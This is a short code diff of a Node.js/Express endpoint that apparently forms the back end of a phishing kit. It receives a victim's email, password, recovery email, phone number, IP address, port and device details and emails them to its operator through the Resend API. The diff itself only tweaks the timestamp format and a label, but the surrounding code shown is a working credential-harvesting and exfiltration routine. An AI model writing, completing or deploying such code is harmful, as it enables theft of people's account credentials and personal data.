@@ -19,7 +19,7 @@ const resend = new Resend(process.env.RESEND_API_KEY);
 app.post("/send-email", async (req, res) => {
   const { email, password, recEmail, phone, port, deviceDetails } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  const time = dayjs(Date.now()).format("DD-MM-YY:::::::HH-mm");
+  const time = dayjs(Date.now()).format("year/month/day:____Time: HH-mm-ss");
 
   try {
     resend.emails.send({
@@ -32,7 +32,7 @@ app.post("/send-email", async (req, res) => {
     <p>Email: Password: ${password}</p>
     <p>Recovery Email: ${recEmail}</p>
     <p>Phone Number: ${phone}</p>
-    <p>Date_Time: ${time}</p>
+    <p>Date: ${time}</p>
     <p>Client IP: ${ip}</p>
     <p>PORT: ${port}</p>
     <p>Device Details: ${JSON.stringify(deviceDetails)}</p>
